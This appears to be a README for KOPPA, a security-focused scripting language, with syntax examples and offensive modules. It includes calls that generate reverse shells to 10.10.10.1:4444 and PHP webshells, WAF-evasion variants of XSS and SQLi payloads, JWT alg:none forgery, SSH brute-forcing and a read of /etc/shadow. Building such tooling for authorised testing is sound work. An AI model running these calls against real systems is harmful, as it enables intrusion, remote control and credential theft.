# KOPPA Language v3.0

**Advanced Cybersecurity Domain-Specific Language**

A programming language built from the ground up for security professionals, penetration testers, and red teamers.

## Why KOPPA?

| Feature | KOPPA | Python |
|---------|-------|--------|
| Pipeline operator `\|>` | `data \|> clean \|> analyze` | Not available |
| String interpolation | `"host: {target}"` | `f"host: {target}"` (needs `f` prefix) |
| Null coalescing | `val ?: "default"` | `val or "default"` (footgun with 0/False) |
| Optional chaining | `resp?.body?.status` | `getattr(getattr(resp,"body",None),"status",None)` |
| Built-in security | `import scan, vuln, payload` | Requires separate pip installs |
| Byte literals | `b"\x90\x90\xcc"` with `.xor()`, `.hex`, `.b64` | Limited operations |
| Bitwise ops | `0xFF & mask`, `addr >> 2`, `key ^ data` | Same |
| Class + pipeline | `Scanner("target") \|> run \|> report` | Verbose |

## Quick Start

```bash
# Install
pip install koppa-lang

# Run a script
koppa run script.kop

# Interactive REPL
koppa repl

# Compile to bytecode
koppa compile script.kop
```

## Hello World

```koppa
import log

fn main() {
    let target = "scanme.nmap.org"
    log.info("Scanning {target}...")
    log.success("Done!")
}
```

Run it:
```bash
koppa run hello.kop
```

## Language Features

### Variables
```koppa
let name   = "KOPPA"        # immutable
var count  = 0              # mutable
const MAX  = 1024           # constant
```

### Functions with Default Parameters
```koppa
fn scan(host, port = 80, timeout = 1.0) {
    return scan.tcp(host, port, timeout)
}

fn log_all(*messages) {
    for msg in messages {
        log.info(msg)
    }
}
```

### Classes
```koppa
class Scanner {
    fn __init__(self, target, timeout = 1.0) {
        self.target  = target
        self.timeout = timeout
        self.results = []
    }

    fn run(self, ports) {
        let open = scan.mass(self.target, ports, self.timeout)
        self.results = open
        return self
    }

    fn report(self) {
        log.info("[{self.target}] Open: {self.results}")
        return self.results
    }
}

let s = new Scanner("192.168.1.1")
s.run([22, 80, 443, 8080]) |> s.report()
```

### Pipeline Operator
```koppa
target
    |> recon.dns()
    |> scan.mass([80, 443, 8080])
    |> filter(open_ports)
    |> report.save("results.json")
```

### Pattern Matching
```koppa
match service {
    "http"  => http.scan(target),
    "https" => tls.scan(target),
    "ssh"   => brute.ssh(target, wordlist),
    "smb"   => enum.smb_shares(target),
    _       => log.warn("Unknown: {service}")
}
```

### Comprehensions
```koppa
let open_ports = [p for p in ports if scan.tcp(host, p)]
let hashes     = {pw: hash.md5(pw) for pw in wordlist}
let cracked    = [h for h in hashes if h.len == 32]
```

### Ternary + Null Coalescing
```koppa
let status = is_open ? "OPEN" : "CLOSED"
let host   = args.host ?: "127.0.0.1"
let port   = resp?.headers?.port ?: 80
```

### Bitwise Operations
```koppa
let masked   = value & 0xFF
let flags    = 0b0001 | 0b0010 | 0b0100
let xored    = key ^ data
let shifted  = addr >> 2
let inverted = ~mask & 0xFFFF
```

### Byte Literals
```koppa
let nop_sled = b"\x90\x90\x90\xcc"
let encoded  = nop_sled.xor(0x41)
log.info("hex: {nop_sled.hex}")
log.info("b64: {nop_sled.b64}")
log.info("len: {nop_sled.len}")
```

### Error Handling
```koppa
try {
    let data = io.read_file("/etc/shadow")
} catch (e) {
    log.warn("Cannot read: {e}")
}
```

### Async / Parallel
```koppa
async fn mass_scan(targets) {
    parallel {
        for target in targets {
            emit scan.mass(target, top_ports)
        }
    }
}
```

## Security Modules

```koppa
import scan, vuln, payload, bypass, session
import hash, encode, jwt, brute, fuzz
import recon, dns, ssl, http, net
import report, log
```

### `scan` — Port Scanning
```koppa
let open = scan.mass("192.168.1.1", [80,443,8080], 0.5)
let svc  = scan.service(443)                          # "https"
let b    = scan.banner("192.168.1.1", 21)
let udp  = scan.udp("192.168.1.1", 53)
```

### `vuln` — Vulnerability Testing
```koppa
let sqli = vuln.sqli_payloads()           # 15+ SQLi payloads
let xss  = vuln.xss_payloads()            # 12+ XSS payloads
let lfi  = vuln.lfi_payloads()            # 10+ LFI payloads

let found = vuln.test_sqli(url, "id")     # active test
let hdr   = vuln.scan_headers(url)        # security headers audit
```

### `payload` — Shell Generation
```koppa
let bash = payload.reverse_shell("bash",       "10.10.10.1", 4444)
let py   = payload.reverse_shell("python",     "10.10.10.1", 4444)
let ps   = payload.reverse_shell("powershell", "10.10.10.1", 4444)
let web  = payload.webshell("php")
let enc  = payload.encode(shell, "base64")
let pat  = payload.msf_pattern(64)
```

### `bypass` — WAF Evasion
```koppa
let xss_vars  = bypass.xss_variants("<script>alert(1)</script>")
let sqli_vars = bypass.sqli_variants("' OR 1=1--")
let ip_vars   = bypass.ip_variants("127.0.0.1")
let encoded   = bypass.encode_chain(payload, "url", "base64")
```

### `session` — HTTP Sessions
```koppa
let s = session.new()
s.set_header("X-Forwarded-For", "127.0.0.1")
let login = s.post("http://target/login", {user: "admin", pass: "test"})
let page  = s.get("http://target/admin")
log.info("Status: {page.status}")
```

### `hash` / `encode`
```koppa
let md5  = hash.md5("password")
let ntlm = hash.ntlm("Password1!")
let b64  = encode.b64_encode("secret")
let hex  = encode.hex_encode(data)
```

### `jwt` — JWT Attacks
```koppa
let decoded = jwt.decode(token)
let none    = jwt.none_alg(token)       # alg:none attack
let cracked = jwt.crack(token, wordlist)
let forged  = jwt.forge({"sub": "admin", "role": "superuser"}, "")
```

## Complete Example — Web Vulnerability Scanner

```koppa
import log, vuln, session, report

fn scan_target(url) {
    log.info("=== Scanning {url} ===")

    # Security headers
    let hdr_result = vuln.scan_headers(url)
    log.warn("Missing headers: {hdr_result.missing.len}")

    # SQL injection
    let sqli_found = vuln.test_sqli(url, "id")
    for finding in sqli_found {
        log.warn("[SQLi] {finding.payload}")
    }

    # XSS
    let xss_found = vuln.test_xss(url, "search")
    for finding in xss_found {
        log.warn("[XSS] {finding.payload}")
    }

    return sqli_found.len + xss_found.len
}

fn main() {
    let targets = ["http://testphp.vulnweb.com"]
    let total = 0

    for target in targets {
        total += scan_target(target)
    }

    log.info("Total findings: {total}")
    total > 0 ? log.warn("Vulnerabilities found!") : log.success("Clean!")
}
```

## Running Scripts

```bash
koppa run script.kop              # interpreter (default)
koppa run --vm script.kop         # bytecode VM (faster)
koppa compile script.kop          # compile to .kpc
koppa disasm script.kop           # show bytecode
koppa lex script.kop              # show tokens
koppa parse script.kop            # show AST
koppa repl                        # interactive REPL
koppa version                     # version info
```

## Package Manager

```bash
koppa pkg install pentest-utils   # install package
koppa pkg list                    # list installed
koppa pkg search scanner          # search registry
koppa pkg init                    # create koppa.json
```

## Installation

```bash
# From PyPI
pip install koppa-lang

# From source
git clone https://github.com/yourusername/koppa
cd koppa
pip install -e .

# Windows (Scoop)
scoop install koppa

# macOS (Homebrew)
brew install koppa

# Docker
docker run -it koppalang/koppa repl
```

## VS Code Extension

Install `koppa-language` from the VS Code marketplace for:
- Syntax highlighting
- Code snippets
- `.kop` file support

## Architecture

```
koppa/
+-- src/
|   +-- lexer.py          # Tokenizer
|   +-- parser.py         # AST builder
|   +-- interpreter.py    # Tree-walk interpreter (default)
|   +-- compiler.py       # Bytecode compiler
|   +-- koppa_opcodes.py  # VM instruction set
|   +-- vm.py             # Stack-based VM
|   +-- stdlib_native.py  # Standard library (Python)
|   +-- pkg_manager.py    # Package manager
|   +-- koppa.py          # CLI entry point
+-- stdlib/
|   +-- core.kop          # Core utilities
|   +-- network.kop       # Network helpers
|   +-- security.kop      # Security demos
+-- examples/
|   +-- hello.kop
|   +-- port_scanner.kop
|   +-- cyber_demo.kop    # Full cybersecurity demo
|   +-- ...
+-- vscode-extension/     # VS Code plugin
+-- tests/
|   +-- run_tests.py
+-- docs/
    +-- LANGUAGE_SPEC.md
    +-- GETTING_STARTED.md
```

## License

MIT License — Built for security professionals, by security professionals.
